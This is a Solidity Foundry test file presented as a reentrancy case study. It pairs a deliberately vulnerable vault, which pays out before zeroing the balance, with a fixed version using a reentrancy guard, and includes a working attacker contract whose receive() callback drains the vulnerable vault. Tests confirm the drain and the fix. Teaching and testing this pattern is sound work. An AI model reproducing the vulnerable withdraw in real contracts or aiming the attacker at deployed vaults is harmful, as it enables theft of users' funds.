// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount != 0, "empty");
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
        balances[msg.sender] = 0;
    }
}

contract FixedVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount != 0, "empty");
        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "transfer failed");
    }
}

contract ReentrantAttacker {
    VulnerableVault internal vulnerable;
    FixedVault internal fixedVault;
    bool internal targetFixedVault;

    constructor(address vulnerable_, address fixed_) {
        vulnerable = VulnerableVault(vulnerable_);
        fixedVault = FixedVault(fixed_);
    }

    function attackVulnerable() external payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();
    }

    function attackFixed() external payable {
        targetFixedVault = true;
        fixedVault.deposit{value: msg.value}();
        fixedVault.withdraw();
    }

    receive() external payable {
        if (targetFixedVault) {
            return;
        }

        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }
}

contract ReentrancyCaseStudyTest is Test {
    VulnerableVault internal vulnerable;
    FixedVault internal fixedVault;
    ReentrantAttacker internal attacker;

    function setUp() external {
        vulnerable = new VulnerableVault();
        fixedVault = new FixedVault();
        attacker = new ReentrantAttacker(address(vulnerable), address(fixedVault));

        vulnerable.deposit{value: 5 ether}();
        fixedVault.deposit{value: 5 ether}();
    }

    function test_reentrancyExploitDrainsVulnerableVault() external {
        attacker.attackVulnerable{value: 1 ether}();
        assertEq(address(vulnerable).balance, 0);
        assertGt(address(attacker).balance, 1 ether);
    }

    function test_fixedVaultBlocksTheSamePattern() external {
        attacker.attackFixed{value: 1 ether}();
        assertEq(address(fixedVault).balance, 5 ether);
    }
}
